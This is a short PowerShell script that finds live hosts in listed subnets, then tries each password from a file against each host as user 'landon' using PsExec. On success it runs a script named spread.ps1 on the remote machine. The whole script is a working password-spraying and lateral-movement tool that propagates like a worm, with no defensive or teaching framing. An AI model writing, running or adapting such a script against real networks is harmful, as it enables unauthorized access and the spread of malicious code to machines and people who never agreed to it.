if (Test-Path .\localips.txt ){
    Remove-Item –path .\localips.txt –recurse
}
Get-Content .\subnets.txt | ForEach {
	$a = 48
	$z = 48
    while ($a -le $z)  {
	  	$IP = $_+'.'+$a
		$pinged = Test-Connection -ComputerName $IP -Count 1 -Quiet
		If ($pinged) {
            Write-Host "$IP"
			$IP >> 'localips.txt'
		}
		$a++
	}
}
Get-Content .\localips.txt | ForEach {
    $cursub = $_
    Write-Host $cursub
	Get-Content .\passwords.txt | ForEach {
	    $curpass = $_
        Write-Host $curpass
		.\PsExec64.exe \\$cursub -u landon -p $curpass powershell.exe -c "$pwd\spread.ps1"
    }
}

